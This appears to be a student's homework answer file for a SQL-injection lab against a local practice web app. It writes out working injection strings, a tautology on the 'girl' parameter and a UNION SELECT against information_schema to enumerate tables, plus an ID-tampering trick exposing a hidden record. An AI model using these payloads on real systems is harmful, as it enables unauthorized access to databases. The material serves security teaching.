@@ -1,0 +1,27 @@
+Assignment 4 	Guatf Nilstadius 
+
+
+1. See extras
+
+2. It is vounrable in /nightclub/girldetail.php
+It takes one parameter (girl) that can be injected with sql. 
+Example: Claudia' or '1'='1
+Will give all girl in the bpr.girl table
+
+3. The tables: girls, users, news 
+I first tried with "UNION ALL SELECT 1, 2, 3 FROM information_schema WHERE '1'='1"
+I got a acces decliend reply. 
+I realised my error and modified the querry to " UNION ALL SELECT table_schema,table_name,null FROM information_schema.tables WHERE '1'='1".
+This gave me all the tables in the database, including system databases. 
+
+4.
+
+
+Extras:
+
+http://127.0.0.1:9999/nightclub/newsfeed.php?feed=3 gives the reply :
+
+You have earned 0.5 points
+
+By changing the data you got access to a record which is marked invisible. Inform your teacher.
+
